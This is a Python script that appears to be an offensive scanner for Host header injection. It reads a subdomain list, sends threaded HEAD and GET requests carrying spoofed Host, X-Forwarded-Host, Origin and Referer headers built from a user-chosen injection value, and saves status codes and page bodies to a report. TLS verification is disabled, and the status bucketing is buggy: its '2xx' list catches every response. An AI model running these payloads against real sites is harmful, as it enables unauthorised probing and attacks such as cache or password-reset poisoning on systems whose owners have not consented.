#!/usr/bin/python3

import requests, threading, time, sys
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry

def run():

	global status2xxList, status5xxList, reportList
	global perc, percShift, reportsCount

	moreHeaders = False
	debug = False
	saveOutput = False

	status2xxList = []
	status5xxList = []
	reportList = []

	for i in range(1, len(sys.argv)):
		if sys.argv[i] == '-h' or sys.argv[i] == '--help':
			print("""\r\r
				Manual:
				\r-h --help - manual
				\r-d --debug - debug mode
				\r-mh --moreHeaders - if selected only the 6th payloads will be used
				\r-o --output - the file will be saved in the current directory with the specified name

				\rTypes of payloads:

				\rPayload 0:
				\rA clear payload without any injection just to probe the target

				\rPayload 1:
				\r{"Host":injection}

				\rPayload 2:
				\r{"Host":subdom+"@"+injection}

				\rPayload 3:
				\r{"Host":injection,"X-Forwarded-Host":subdom}

				\rPayload 4:
				\r{"Host":subdom, "X-Forwarded-Host":injection}

				\rPayload 5:
				\r{"Host":subdom, "X-Forwarded-Host":subdom+"@"+injection}

				\rPayload 6:
				\r{"Host":injection, "Cache-Control":"no-transform", "User-Agent":injection, #6
				\r"Referer":injection, "X-Forwarded-Host":injection, "X-Forwarded-For": injection,
				\r"Origin":injection}
				""")
			return
		if sys.argv[i] == '-d' or sys.argv[i] == '--debug':
			debug = True
		if sys.argv[i] == '-mh' or sys.argv[i] == '--moreHeaders':
			moreHeaders = True
		if sys.argv[i] == '-o' or sys.argv[i] == '--output':
			saveOutput = True
			outputName = sys.argv[i+1]

	filename = input("Specify the filename:\n")
	injection = input("Specify the injection:\n")

	file = open(filename,"r")
	subdomsList = file.readlines()
	file.close()

	subdomsList = [subdom.strip() for subdom in subdomsList]

	perc = 0
	reportsCount = 0
	targetsCount = len(subdomsList)*2
	percShift = 100 / targetsCount

	print('Starting...')
	for i in range(len(subdomsList)):
		runThreads("http://"+subdomsList[i], subdomsList[i], injection, moreHeaders, debug)
		runThreads("https://"+subdomsList[i], subdomsList[i], injection, moreHeaders, debug)
		#time.sleep(0.05)

	try:
		while reportsCount != targetsCount: # waiting for all the threads
			print(f"{reportsCount}/{targetsCount} targets are scanned. If you are stuck for too long, hit Ctrl+C", end="\r")
			#time.sleep(5)
	except KeyboardInterrupt:
		if saveOutput:
			print("\nSaving and exiting...\n")
			saveTheResults(reportList, status2xxList, status5xxList, outputName)
		exit()


	print('\nScan is done! Saving the report...')

	if saveOutput:
		saveTheResults(reportList, status2xxList, status5xxList, outputName)

def saveTheResults(reportList, status2xxList, status5xxList, outputName):
	newFile = open(outputName, "w+", encoding='utf-8')
	written = 0

	for i in range(len(reportList)):
		newFile.write(str(reportList[i] + "\n"))
	written += 1

	newFile.write("\n\nSome interesting info for you:\n")
	newFile.write("Status 2xx targets:\n")
	status2xxList = list(set(status2xxList))
	for i in range(len(status2xxList)):
		newFile.write(str(status2xxList[i] + "\n"))
	written += 1

	newFile.write("\nStatus 5xx targets:\n")
	status5xxList = list(set(status5xxList))
	for i in range(len(status5xxList)):
		newFile.write(str(status5xxList[i] + "\n"))
	written += 1

	if written == 3:
		print("Saved!")

	newFile.close()


def runThreads(target, subdom, injection, moreHeaders, debug):
	thread = threading.Thread(target=processTheTarget, args=(target, subdom, injection, moreHeaders, debug))
	thread.start()

def processTheTarget(target, subdom, injection, moreHeaders, debug):

	global perc, percShift, reportsCount
	#if (round(perc + percShift, 3) < 100):
	#	perc += percShift
	#	print(f'{round(perc, 3)}%', end="\r")

	if moreHeaders:
		report = f"Target: {target}, data:\n"
		r = getResponse(target, subdom, "head", 6, injection, debug)

		if type(r) != str:
			report += str(r.status_code)
		elif type(r) == str:
			report += "something went wrong..."

		report += "\n"+("-"*100)+"\n"
		reportList.append(report)
		reportsCount += 1


	if not moreHeaders:
		report = f"Target: {target}, data:\n"

		for i in range(6):
			r = getResponse(target, subdom, "head", i, injection, debug)

			if type(r) != str: # it means that there is no error
				#response = f"\nPayload number: {i}\n\nStatus code: {r.status_code}\n\nResponse headers: {r.headers}\n"
				response = f"\nPayload number: {i}\n\nStatus code: {r.status_code}\n\n"
				report += response

				if r.status_code == 200:
					response = getResponse(target, subdom, "get", i, injection, debug)
					report += "\n"+response+"\n"

			if type(r) == str: # it means that there is an error, because request object must be returned
				report += "\n"+r+"\n"


		report += "\n"+("-"*100)+"\n"
		reportList.append(report)
		reportsCount += 1


def getResponse(target, subdom, method, payloadNum, injection, debug):
	payloadsList = []
	payloadsList.append({}) #0
	payloadsList.append({"Host":injection}) #1
	payloadsList.append({"Host":subdom+"@"+injection}) #2
	payloadsList.append({"Host":injection,"X-Forwarded-Host":subdom}) #3
	payloadsList.append({"Host":subdom, "X-Forwarded-Host":injection}) #4
	payloadsList.append({"Host":subdom, "X-Forwarded-Host":subdom+"@"+injection}) #5
	payloadsList.append({"Host":injection, "Cache-Control":"no-transform", "User-Agent":injection, #6
			"Referer":injection, "X-Forwarded-Host":injection, "X-Forwarded-For": injection,
			"Origin":injection})

	retry_strategy = Retry(total=3, backoff_factor=1)
	adapter = HTTPAdapter(max_retries=retry_strategy)
	http = requests.Session()
	http.mount("https://", adapter)
	http.mount("http://", adapter)

	if method == "head":

		try:	
			r = http.head(target, headers=payloadsList[payloadNum], timeout=3, verify=False)
			if r.status_code >= 200: status2xxList.append(target)
			if r.status_code >= 500: status5xxList.append(target)

			if debug: print(target, payloadsList[payloadNum], r)
			return r
		except Exception as exception:
			response = f"Error {exception}, using payload: {payloadsList[payloadNum]}"
			if debug: print(response+"on "+target)
			return response

	if method == "get":
		try:
			r = http.get(target, headers=payloadsList[payloadNum], timeout=5, verify=False)
			if debug: print(target, payloadsList[payloadNum], r)

			response = f"Content of the page {target}:\n\n{r.text}\n"
			return response
		except Exception as exception:
			response = f"Error {exception}, making a GET request, using payload: {payloadsList[payloadNum]}"
			if debug: print(response+"on "+target)
			return response 

run()
